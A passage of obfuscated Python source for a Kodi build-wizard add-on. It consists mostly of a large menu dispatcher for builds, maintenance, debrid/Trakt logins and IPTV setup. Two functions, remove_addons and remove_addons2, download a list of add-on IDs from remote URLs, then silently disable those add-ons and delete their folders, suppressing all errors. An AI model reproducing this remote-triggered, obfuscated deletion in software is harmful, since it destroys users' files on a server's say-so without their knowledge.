    O0O00OOOO0OO00OOO .setProperty ("Fanart_Image",fanart )#line:5137
    if not menu ==None :O0O00OOOO0OO00OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5138
    OO0O0O0OO00O0000O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00OOOO0OO0000OO ,listitem =O0O00OOOO0OO00OOO ,isFolder =False )#line:5139
    return OO0O0O0OO00O0000O #line:5140
def get_params (user_params =''):#line:5143
        O0OO0OO000O0OO0OO =dict (parse_qsl (user_params .replace ('?','')))#line:5145
        return O0OO0OO000O0OO0OO #line:5146
def remove_addons ():#line:5147
	try :#line:5148
			import json #line:5149
			O00OO0000OO0O0OO0 =urlopen (remove_url ).readlines ()#line:5150
			for OOOO00000OOOO00O0 in O00OO0000OO0O0OO0 :#line:5151
				OO0000OOO000O0OOO =OOOO00000OOOO00O0 .split (':')[1 ].strip ()#line:5153
				OO00OO00O0000O00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO0000OOO000O0OOO ,'false')#line:5154
				O00000O0OO00000O0 =xbmc .executeJSONRPC (OO00OO00O0000O00O )#line:5155
				O000O0O0OO0OO0000 =json .loads (O00000O0OO00000O0 )#line:5156
				OOO0OOO000OOOOO00 =os .path .join (addons_folder ,OO0000OOO000O0OOO )#line:5158
				if os .path .exists (OOO0OOO000OOOOO00 ):#line:5160
					for OO000O0O00OO00O00 ,O00000OOOOO0000OO ,O000O00O0OOOOOOO0 in os .walk (OOO0OOO000OOOOO00 ):#line:5161
						for O0O0O0OO0O0O0O00O in O000O00O0OOOOOOO0 :#line:5162
							os .unlink (os .path .join (OO000O0O00OO00O00 ,O0O0O0OO0O0O0O00O ))#line:5163
						for O0OOO000OOO00O00O in O00000OOOOO0000OO :#line:5164
							shutil .rmtree (os .path .join (OO000O0O00OO00O00 ,O0OOO000OOO00O00O ))#line:5165
					os .rmdir (OOO0OOO000OOOOO00 )#line:5166
			xbmc .executebuiltin ('Container.Refresh')#line:5168
			xbmc .executebuiltin ("UpdateLocalAddons()")#line:5169
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5170
	except :pass #line:5171
def remove_addons2 ():#line:5172
	try :#line:5173
			import json #line:5174
			O0OOOO000OO0O0O0O =urlopen (remove_url2 ).readlines ()#line:5175
			for OOO0O0OO0O00O0O0O in O0OOOO000OO0O0O0O :#line:5176
				OO0O0O00OOOOO00O0 =OOO0O0OO0O00O0O0O .split (':')[1 ].strip ()#line:5178
				OOO000000O0O0O0OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0O0O00OOOOO00O0 ,'false')#line:5179
				O0O00O0OOO0O000OO =xbmc .executeJSONRPC (OOO000000O0O0O0OO )#line:5180
				O00OOO0OOOOO000OO =json .loads (O0O00O0OOO0O000OO )#line:5181
				OOOO0OO0O0O000O00 =os .path .join (user_folder ,OO0O0O00OOOOO00O0 )#line:5183
				if os .path .exists (OOOO0OO0O0O000O00 ):#line:5185
					for O0O00OO0O0O00OOO0 ,O0O0O00000OOO0O0O ,OOOO000000O0O0000 in os .walk (OOOO0OO0O0O000O00 ):#line:5186
						for O0OOOO0O0000O0OO0 in OOOO000000O0O0000 :#line:5187
							os .unlink (os .path .join (O0O00OO0O0O00OOO0 ,O0OOOO0O0000O0OO0 ))#line:5188
						for OOOO00OOOOOOOO0OO in O0O0O00000OOO0O0O :#line:5189
							shutil .rmtree (os .path .join (O0O00OO0O0O00OOO0 ,OOOO00OOOOOOOO0OO ))#line:5190
					os .rmdir (OOOO0OO0O0O000O00 )#line:5191
	except :pass #line:5193
def setView (O00000OOO0000O00O ,O00OOO0O0O0O00OO0 ):#line:5207
    if wiz .getS ('auto-view')=='true':#line:5208
        O0OO0OOO000000OO0 =wiz .getS (O00OOO0O0O0O00OO0 )#line:5209
        if O0OO0OOO000000OO0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0OO0OOO000000OO0 ='55'#line:5210
        if O0OO0OOO000000OO0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0OO0OOO000000OO0 ='50'#line:5211
        wiz .ebi ("Container.SetViewMode(%s)"%O0OO0OOO000000OO0 )#line:5212
def refresh_list (OO0OOOO0O0OOO0OOO ,OOO00O000O0000OOO ,Addon_id =""):#line:5213
    global name #line:5214
    OOOOOO00000OOO00O =get_params (user_params =OO0OOOO0O0OOO0OOO )#line:5216
    O0O0O00OO0OO0OOO0 =None #line:5218
    name =None #line:5219
    O000O000O00OOO0OO =None #line:5220
    try :O000O000O00OOO0OO =unque (OOOOOO00000OOO00O ["mode"])#line:5222
    except :pass #line:5223
    try :name =unque (OOOOOO00000OOO00O ["name"])#line:5224
    except :pass #line:5225
    try :O0O0O00OO0OO0OOO0 =unque (OOOOOO00000OOO00O ["url"])#line:5226
    except :pass #line:5227
    if O000O000O00OOO0OO ==None :buildMenu ()#line:5228
    elif O000O000O00OOO0OO =='user_info':wiz .user_info ()#line:5229
    elif O000O000O00OOO0OO =='wizardupdate':wiz .wizardUpdate ()#line:5230
    elif O000O000O00OOO0OO =='builds':buildMenu ()#line:5231
    elif O000O000O00OOO0OO =='STARTP':wiz .STARTP (refresh ='true')#line:5232
    elif O000O000O00OOO0OO =='STARTP2':u_list (ld (BL ),refresh ='true')#line:5233
    elif O000O000O00OOO0OO =='viewbuild':viewBuild (name )#line:5235
    elif O000O000O00OOO0OO =='buildinfo':buildInfo (name )#line:5236
    elif O000O000O00OOO0OO =='buildpreview':buildVideo (name )#line:5237
    elif O000O000O00OOO0OO =='install':buildWizard (name ,O0O0O00OO0OO0OOO0 )#line:5238
    elif O000O000O00OOO0OO =='theme':buildWizard (name ,O000O000O00OOO0OO ,O0O0O00OO0OO0OOO0 )#line:5239
    elif O000O000O00OOO0OO =='editthird':editThirdParty (name );wiz .refresh ()#line:5241
    elif O000O000O00OOO0OO =='maint':maintMenu (name )#line:5243
    elif O000O000O00OOO0OO =='passpin':passandpin ()#line:5244
    elif O000O000O00OOO0OO =='backmyupbuild':backmyupbuild ()#line:5245
    elif O000O000O00OOO0OO =='kodi17fix':wiz .kodi17Fix ()#line:5246
    elif O000O000O00OOO0OO =='kodi177fix':wiz .kodi177Fix ()#line:5247
    elif O000O000O00OOO0OO =='advancedsetting':advancedWindow (name )#line:5248
    elif O000O000O00OOO0OO =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5249
    elif O000O000O00OOO0OO =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5250
    elif O000O000O00OOO0OO =='asciicheck':wiz .asciiCheck ()#line:5251
    elif O000O000O00OOO0OO =='backupbuild':wiz .backUpOptions ('build')#line:5252
    elif O000O000O00OOO0OO =='backupgui':wiz .backUpOptions ('guifix')#line:5253
    elif O000O000O00OOO0OO =='backuptheme':wiz .backUpOptions ('theme')#line:5254
    elif O000O000O00OOO0OO =='backupaddon':wiz .backUpOptions ('addondata')#line:5255
    elif O000O000O00OOO0OO =='oldThumbs':wiz .oldThumbs ()#line:5256
    elif O000O000O00OOO0OO =='clearbackup':wiz .cleanupBackup ()#line:5257
    elif O000O000O00OOO0OO =='convertpath':wiz .convertSpecial (HOME )#line:5258
    elif O000O000O00OOO0OO =='currentsettings':viewAdvanced ()#line:5259
    elif O000O000O00OOO0OO =='fullclean':totalClean ();wiz .refresh ()#line:5260
    elif O000O000O00OOO0OO =='clearcache':clearCache ();wiz .refresh ()#line:5261
    elif O000O000O00OOO0OO =='fixwizard':fixwizard ();wiz .refresh ()#line:5262
    elif O000O000O00OOO0OO =='testcommand':testcommand ()#line:5263
    elif O000O000O00OOO0OO =='logsend':logsend ()#line:5264
    elif O000O000O00OOO0OO =='setrd':setrealdebrid ()#line:5265
    elif O000O000O00OOO0OO =='setrd2':setautorealdebrid ()#line:5266
    elif O000O000O00OOO0OO =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5267
    elif O000O000O00OOO0OO =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5268
    elif O000O000O00OOO0OO =='clearthumb':clearThumb ();wiz .refresh ()#line:5269
    elif O000O000O00OOO0OO =='checksources':wiz .checkSources ();wiz .refresh ()#line:5270
    elif O000O000O00OOO0OO =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5271
    elif O000O000O00OOO0OO =='freshstart':freshStart ()#line:5272
    elif O000O000O00OOO0OO =='forceupdate':wiz .forceUpdate ()#line:5273
    elif O000O000O00OOO0OO =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5274
    elif O000O000O00OOO0OO =='forceclose':wiz .killxbmc ()#line:5275
    elif O000O000O00OOO0OO =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5276
    elif O000O000O00OOO0OO =='hidepassword':wiz .hidePassword ()#line:5277
    elif O000O000O00OOO0OO =='unhidepassword':wiz .unhidePassword ()#line:5278
    elif O000O000O00OOO0OO =='enableaddons':enableAddons ()#line:5279
    elif O000O000O00OOO0OO =='toggleaddon':wiz .toggleAddon (name ,O0O0O00OO0OO0OOO0 );wiz .refresh ()#line:5280
    elif O000O000O00OOO0OO =='togglecache':toggleCache (name );wiz .refresh ()#line:5281
    elif O000O000O00OOO0OO =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5282
    elif O000O000O00OOO0OO =='changefeq':changeFeq ();wiz .refresh ()#line:5283
    elif O000O000O00OOO0OO =='uploadlog':uploadLog .Main ()#line:5284
    elif O000O000O00OOO0OO =='viewlog':LogViewer ()#line:5285
    elif O000O000O00OOO0OO =='viewwizlog':LogViewer (WIZLOG )#line:5286
    elif O000O000O00OOO0OO =='viewerrorlog':errorChecking (all =True )#line:5287
    elif O000O000O00OOO0OO =='clearwizlog':OOOOOOO00OO00OOOO =open (WIZLOG ,'w');OOOOOOO00OO00OOOO .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5288
    elif O000O000O00OOO0OO =='purgedb':purgeDb ()#line:5289
    elif O000O000O00OOO0OO =='fixaddonupdate':fixUpdate ()#line:5290
    elif O000O000O00OOO0OO =='removeaddons':removeAddonMenu ()#line:5291
    elif O000O000O00OOO0OO =='removeaddon':removeAddon (name )#line:5292
    elif O000O000O00OOO0OO =='removeaddondata':removeAddonDataMenu ()#line:5293
    elif O000O000O00OOO0OO =='removedata':removeAddonData (name )#line:5294
    elif O000O000O00OOO0OO =='resetaddon':OOO00O00000O00OOO =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5295
    elif O000O000O00OOO0OO =='systeminfo':systemInfo ()#line:5296
    elif O000O000O00OOO0OO =='restorezip':restoreit ('build')#line:5297
    elif O000O000O00OOO0OO =='restoregui':restoreit ('gui')#line:5298
    elif O000O000O00OOO0OO =='restoreaddon':restoreit ('addondata')#line:5299
    elif O000O000O00OOO0OO =='restoreextzip':restoreextit ('build')#line:5300
    elif O000O000O00OOO0OO =='restoreextgui':restoreextit ('gui')#line:5301
    elif O000O000O00OOO0OO =='restoreextaddon':restoreextit ('addondata')#line:5302
    elif O000O000O00OOO0OO =='writeadvanced':writeAdvanced (name ,O0O0O00OO0OO0OOO0 )#line:5303
    elif O000O000O00OOO0OO =='traktsync':traktsync ()#line:5304
    elif O000O000O00OOO0OO =='apk':apkMenu (name )#line:5306
    elif O000O000O00OOO0OO =='apkscrape':apkScraper (name )#line:5307
    elif O000O000O00OOO0OO =='apkinstall':apkInstaller (name ,O0O0O00OO0OO0OOO0 )#line:5308
    elif O000O000O00OOO0OO =='speed':speedMenu ()#line:5309
    elif O000O000O00OOO0OO =='net':net_tools ()#line:5310
    elif O000O000O00OOO0OO =='GetList':GetList (O0O0O00OO0OO0OOO0 )#line:5311
    elif O000O000O00OOO0OO =='viewVideo':playVideo (O0O0O00OO0OO0OOO0 )#line:5312
    elif O000O000O00OOO0OO =='addons':addonMenu (name )#line:5314
    elif O000O000O00OOO0OO =='addoninstall':addonInstaller (name ,O0O0O00OO0OO0OOO0 )#line:5315
    elif O000O000O00OOO0OO =='savedata':saveMenu ()#line:5317
    elif O000O000O00OOO0OO =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5318
    elif O000O000O00OOO0OO =='whitelist':wiz .whiteList (name )#line:5320
    elif O000O000O00OOO0OO =='trakt':traktMenu ()#line:5322
    elif O000O000O00OOO0OO =='savetrakt':traktit .traktIt ('update',name )#line:5323
    elif O000O000O00OOO0OO =='restoretrakt':traktit .traktIt ('restore',name )#line:5324
    elif O000O000O00OOO0OO =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5325
    elif O000O000O00OOO0OO =='cleartrakt':traktit .clearSaved (name )#line:5326
    elif O000O000O00OOO0OO =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5327
    elif O000O000O00OOO0OO =='updatetrakt':traktit .autoUpdate ('all')#line:5328
    elif O000O000O00OOO0OO =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5329
    elif O000O000O00OOO0OO =='realdebrid':realMenu ()#line:5331
    elif O000O000O00OOO0OO =='savedebrid':debridit .debridIt ('update',name )#line:5332
    elif O000O000O00OOO0OO =='restoredebrid':debridit .debridIt ('restore',name )#line:5333
    elif O000O000O00OOO0OO =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5334
    elif O000O000O00OOO0OO =='cleardebrid':debridit .clearSaved (name )#line:5335
    elif O000O000O00OOO0OO =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5336
    elif O000O000O00OOO0OO =='updatedebrid':debridit .autoUpdate ('all')#line:5337
    elif O000O000O00OOO0OO =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5338
    elif O000O000O00OOO0OO =='login':loginMenu ()#line:5340
    elif O000O000O00OOO0OO =='savelogin':loginit .loginIt ('update',name )#line:5341
    elif O000O000O00OOO0OO =='restorelogin':loginit .loginIt ('restore',name )#line:5342
    elif O000O000O00OOO0OO =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5343
    elif O000O000O00OOO0OO =='clearlogin':loginit .clearSaved (name )#line:5344
    elif O000O000O00OOO0OO =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5345
    elif O000O000O00OOO0OO =='updatelogin':loginit .autoUpdate ('all')#line:5346
    elif O000O000O00OOO0OO =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5347
    elif O000O000O00OOO0OO =='contact':notify .contact (CONTACT )#line:5349
    elif O000O000O00OOO0OO =='settings':wiz .openS (name );wiz .refresh ()#line:5350
    elif O000O000O00OOO0OO =='opensettings':O0OOOO000OOO00OOO =eval (O0O0O00OO0OO0OOO0 .upper ()+'ID')[name ]['plugin'];OO0O00OOO000O00O0 =wiz .addonId (O0OOOO000OOO00OOO );OO0O00OOO000O00O0 .openSettings ();wiz .refresh ()#line:5351
    elif O000O000O00OOO0OO =='developer':developer ()#line:5353
    elif O000O000O00OOO0OO =='converttext':wiz .convertText ()#line:5354
    elif O000O000O00OOO0OO =='createqr':wiz .createQR ()#line:5355
    elif O000O000O00OOO0OO =='testnotify':testnotify ()#line:5356
    elif O000O000O00OOO0OO =='testnotify2':testnotify2 ()#line:5357
    elif O000O000O00OOO0OO =='servicemanual':servicemanual ()#line:5358
    elif O000O000O00OOO0OO =='fastinstall':fastinstall ()#line:5359
    elif O000O000O00OOO0OO =='testupdate':testupdate ()#line:5360
    elif O000O000O00OOO0OO =='testfirst':testfirst ()#line:5361
    elif O000O000O00OOO0OO =='testfirstrun':testfirstRun ()#line:5362
    elif O000O000O00OOO0OO =='testapk':notify .apkInstaller ('SPMC')#line:5363
    elif O000O000O00OOO0OO =='bg':wiz .bg_install (name ,O0O0O00OO0OO0OOO0 )#line:5365
    elif O000O000O00OOO0OO =='bgcustom':wiz .bg_custom ()#line:5366
    elif O000O000O00OOO0OO =='bgremove':wiz .bg_remove ()#line:5367
    elif O000O000O00OOO0OO =='bgdefault':wiz .bg_default ()#line:5368
    elif O000O000O00OOO0OO =='rdset':rdsetup ()#line:5369
    elif O000O000O00OOO0OO =='mor':morsetup ()#line:5370
    elif O000O000O00OOO0OO =='mor2':morsetup2 ()#line:5371
    elif O000O000O00OOO0OO =='firstinstall':firstinstall ()#line:5372
    elif O000O000O00OOO0OO =='resolveurl':resolveurlsetup ()#line:5373
    elif O000O000O00OOO0OO =='urlresolver':urlresolversetup ()#line:5374
    elif O000O000O00OOO0OO =='forcefastupdate':forcefastupdate ()#line:5375
    elif O000O000O00OOO0OO =='help_install':help_install ()#line:5376
    elif O000O000O00OOO0OO =='traktset':traktsetup ()#line:5378
    elif O000O000O00OOO0OO =='placentaset':placentasetup ()#line:5379
    elif O000O000O00OOO0OO =='flixnetset':flixnetsetup ()#line:5380
    elif O000O000O00OOO0OO =='reptiliaset':reptiliasetup ()#line:5381
    elif O000O000O00OOO0OO =='yodasset':yodasetup ()#line:5382
    elif O000O000O00OOO0OO =='numbersset':numberssetup ()#line:5383
    elif O000O000O00OOO0OO =='uranusset':uranussetup ()#line:5384
    elif O000O000O00OOO0OO =='genesisset':genesissetup ()#line:5385
    elif O000O000O00OOO0OO =='fastupdate':fastupdate ()#line:5386
    elif O000O000O00OOO0OO =='folderback':folderback ()#line:5387
    elif O000O000O00OOO0OO =='menudata':Menu ()#line:5388
    elif O000O000O00OOO0OO =='infoupdate':infobuild (False )#line:5389
    elif O000O000O00OOO0OO =='infoupdate_busydialog':infoupdate_busydialog (False )#line:5390
    elif O000O000O00OOO0OO =='wait':wait ()#line:5391
    elif O000O000O00OOO0OO ==2 :#line:5392
            wiz .torent_menu ()#line:5393
    elif O000O000O00OOO0OO ==3 :#line:5394
            wiz .popcorn_menu ()#line:5395
    elif O000O000O00OOO0OO ==8 :#line:5396
            wiz .metaliq_fix ()#line:5397
    elif O000O000O00OOO0OO ==9 :#line:5398
            wiz .quasar_menu ()#line:5399
    elif O000O000O00OOO0OO ==5 :#line:5400
            swapSkins ('skin.Premium.mod')#line:5401
    elif O000O000O00OOO0OO ==13 :#line:5402
            wiz .elementum_menu ()#line:5403
    elif O000O000O00OOO0OO ==16 :#line:5404
            wiz .fix_wizard ()#line:5405
    elif O000O000O00OOO0OO ==17 :#line:5406
            wiz .last_play ()#line:5407
    elif O000O000O00OOO0OO ==18 :#line:5408
            wiz .normal_metalliq ()#line:5409
    elif O000O000O00OOO0OO ==19 :#line:5410
            wiz .fast_metalliq ()#line:5411
    elif O000O000O00OOO0OO ==20 :#line:5412
            wiz .fix_buffer2 ()#line:5413
    elif O000O000O00OOO0OO ==21 :#line:5414
            wiz .fix_buffer3 ()#line:5415
    elif O000O000O00OOO0OO ==11 :#line:5416
            wiz .fix_buffer ()#line:5417
    elif O000O000O00OOO0OO ==15 :#line:5418
            wiz .fix_font ()#line:5419
    elif O000O000O00OOO0OO ==14 :#line:5420
            wiz .clean_pass ()#line:5421
    elif O000O000O00OOO0OO ==22 :#line:5422
            wiz .movie_update ()#line:5423
    elif O000O000O00OOO0OO =='simpleiptv':#line:5426
        O0OOOOO0OOO000OO0 =xbmcgui .Dialog ()#line:5428
        O00OOO0OO0O0O0O00 =O0OOOOO0OOO000OO0 .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:5429
        if O00OOO0OO0O0O0O00 ==1 :#line:5430
            iptvkodi17_18 ()#line:5431
        else :#line:5433
         sys .exit ()#line:5434
    elif O000O000O00OOO0OO =='sex_menu_open':sex_menu_open ()#line:5437
    elif O000O000O00OOO0OO =='sex_menu_luck':sex_menu_luck (notify ='true')#line:5438
    elif O000O000O00OOO0OO =='tv_widget_tele':tv_widget_tele (notify ='true')#line:5439
    elif O000O000O00OOO0OO =='tv_widget_kitana':tv_widget_kitana (notify ='true')#line:5440
    elif O000O000O00OOO0OO =='open_turkey':open_turkey ()#line:5441
    elif O000O000O00OOO0OO =='force_update':force_update ()#line:5442
    elif O000O000O00OOO0OO =='update_tele':auto_build_update (NOTEID )#line:5443
    elif O000O000O00OOO0OO =='update_movie':auto_movie_update (NOTEID3 )#line:5444
    elif O000O000O00OOO0OO =='adv_settings':auto_buffer ()#line:5445
    elif O000O000O00OOO0OO =='adv_settings_fromskin':auto_buffer_fromskin ()#line:5446
    elif O000O000O00OOO0OO =='cleanbuffer':clean_buffer ()#line:5447
    elif O000O000O00OOO0OO =='getpass':getpass ()#line:5448
    elif O000O000O00OOO0OO =='setpass':setpass ()#line:5449
    elif O000O000O00OOO0OO =='setuname':setuname ()#line:5450
    elif O000O000O00OOO0OO =='check_firebase':check_firebase ()#line:5451
    elif O000O000O00OOO0OO =='passandUsername':passandUsername ()#line:5453
    elif O000O000O00OOO0OO =='9':disply_hwr ()#line:5454
    elif O000O000O00OOO0OO =='99':disply_hwr2 ()#line:5455
    elif O000O000O00OOO0OO =='80':send_hwr ()#line:5456
    elif O000O000O00OOO0OO =='linux':linux_pack ()#line:5457
    elif O000O000O00OOO0OO =='telemedia5':telemedia5 ()#line:5458
    xbmcplugin .endOfDirectory (int (sys .argv [1 ]))